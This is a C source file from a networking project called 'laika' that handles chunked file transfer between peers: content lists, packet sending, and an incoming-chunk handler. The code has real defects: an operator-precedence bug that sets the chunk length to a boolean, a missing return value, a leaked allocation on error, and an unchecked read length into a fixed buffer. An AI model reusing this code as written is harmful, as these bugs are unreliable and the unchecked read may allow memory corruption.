#include "laika.h"
#include "lcontent.h"
#include "lmem.h"
#include "lerror.h"

#include "lsocket.h"
#include "lpeer.h"

#define CONTENTCHUNK_MAX_BODY (LAIKA_MAX_PKTSIZE-sizeof(CONTENT_ID))

size_t getSize(FILE *fd) {
    size_t sz;
    fseek(fd, 0L, SEEK_END);
    sz = ftell(fd);
    fseek(fd, 0L, SEEK_SET);
    return sz;
}

struct sLaika_content* getContentByID(struct sLaika_contentContext *context, CONTENT_ID id) {
    struct sLaika_content *curr = context->headIn;

    while (curr) {
        if (curr->id == id) 
            return curr;

        curr = curr->next;
    }

    return NULL;
}

void freeContent(struct sLaika_content *content) {
    fclose(content->fd);
    laikaM_free(content);
}

void rmvFromOut(struct sLaika_contentContext *context, struct sLaika_content *content) {
    struct sLaika_content *last = NULL, *curr = context->headOut;

    while (curr) {
        /* if found, remove it! */
        if (curr == content) {
            if (last)
                last->next = curr->next;
            else
                context->headOut = curr->next;

            freeContent(curr);
            break;
        }

        last = curr;
        curr = curr->next;
    }
}

void rmvFromIn(struct sLaika_contentContext *context, struct sLaika_content *content) {
    struct sLaika_content *last = NULL, *curr = context->headIn;

    while (curr) {
        /* if found, remove it! */
        if (curr == content) {
            if (last)
                last->next = curr->next;
            else
                context->headIn = curr->next;

            freeContent(curr);
            break;
        }

        last = curr;
        curr = curr->next;
    }
}

void sendContentError(struct sLaika_peer *peer, CONTENT_ID id, CONTENT_ERRCODE err) {
    laikaS_startOutPacket(peer, LAIKAPKT_CONTENT_ERROR);
    laikaS_writeInt(&peer->sock, &id, sizeof(CONTENT_ID));
    laikaS_writeByte(&peer->sock, err);
    laikaS_endOutPacket(peer);
}

void laikaF_initContext(struct sLaika_contentContext *context) {
    context->headIn = NULL;
    context->headOut = NULL;
    context->nextID = 0;
}

void laikaF_cleanContext(struct sLaika_contentContext *context) {
    struct sLaika_content *tmp, *curr;

    /* free IN list */
    curr = context->headIn;
    while (curr) {
        tmp = curr->next;
        freeContent(curr);
        curr = tmp;
    }

    /* free OUT list */
    curr = context->headOut;
    while (curr) {
        tmp = curr->next;
        freeContent(curr);
        curr = tmp;
    }
}

int laikaF_newOutContent(struct sLaika_peer *peer, FILE *fd, CONTENT_TYPE type) {
    struct sLaika_content *content = (struct sLaika_content*)laikaM_malloc(sizeof(struct sLaika_content));
    struct sLaika_contentContext *context = &peer->context;

    /* init content struct */
    content->fd = fd;
    content->sz = getSize(fd);
    content->processed = 0;
    content->id = context->nextID++;
    content->type = type;

    /* add to list */
    content->next = context->headOut;
    context->headOut = content;

    /* let the peer know we're sending them some content */
    laikaS_startOutPacket(peer, LAIKAPKT_CONTENT_NEW);
    laikaS_writeInt(&peer->sock, &content->id, sizeof(CONTENT_ID));
    laikaS_writeInt(&peer->sock, &content->sz, sizeof(uint32_t));
    laikaS_writeByte(&peer->sock, type);
    laikaS_endOutPacket(peer);
}

/* new content we're recieving from a peer */
void laikaF_newInContent(struct sLaika_peer *peer, CONTENT_ID id, uint32_t sz, CONTENT_TYPE type) {
    struct sLaika_content *content = (struct sLaika_content*)laikaM_malloc(sizeof(struct sLaika_content));
    struct sLaika_contentContext *context = &peer->context;

    if (getContentByID(context, id)) {
        sendContentError(peer, id, CONTENT_ERR_ID_IN_USE);
        LAIKA_ERROR("ID [%d] is in use!\n", id);
    }

    content->fd = tmpfile();
    content->sz = sz;
    content->processed = 0;
    content->id = id;
    content->type = type;

    /* add to list */
    content->next = context->headIn;
    context->headIn = content;
}

void laikaF_pollContent(struct sLaika_peer *peer) {
    uint8_t buff[CONTENTCHUNK_MAX_BODY];
    struct sLaika_contentContext *context = &peer->context;
    struct sLaika_content *tmp, *curr = context->headOut;
    int rd;

    /* traverse our out content, sending each chunk */
    while (curr) {
        /* if we've reached the end of the file stream, remove it! */
        if (rd = fread(buff, sizeof(uint8_t), MIN(curr->sz - curr->processed, CONTENTCHUNK_MAX_BODY), curr->fd) == 0) {
            tmp = curr->next;
            rmvFromOut(context, curr);
            curr = tmp;
            continue;
        }

        /* send chunk */
        laikaS_startVarPacket(peer, LAIKAPKT_CONTENT_CHUNK);
        laikaS_writeInt(&peer->sock, &curr->id, sizeof(CONTENT_ID));
        laikaS_write(&peer->sock, buff, rd);
        laikaS_endVarPacket(peer);

        curr->processed += rd;
        curr = curr->next;
    }
}

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaF_handleContentChunk(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t buff[CONTENTCHUNK_MAX_BODY];
    struct sLaika_contentContext *context = &peer->context;
    struct sLaika_content *content;
    CONTENT_ID id;
    size_t bodySz = sz-sizeof(CONTENT_ID);

    if (sz <= sizeof(CONTENT_ID))
        LAIKA_ERROR("malformed chunk packet!\n");

    /* read and sanity check id */
    laikaS_readInt(&peer->sock, &id, sizeof(CONTENT_ID));
    if ((content = getContentByID(context, id)) == NULL)
        LAIKA_ERROR("chunk recieved with invalid id! [%d]\n", id);

    /* read data & write to file */
    laikaS_read(&peer->sock, buff, bodySz);
    if (fwrite(buff, sizeof(uint8_t), bodySz, content->fd) != bodySz) {
        rmvFromIn(context, content);
    } else {
        /* TODO: if content->processed == content->sz then handle full file received event */
        content->processed += bodySz;
    }
}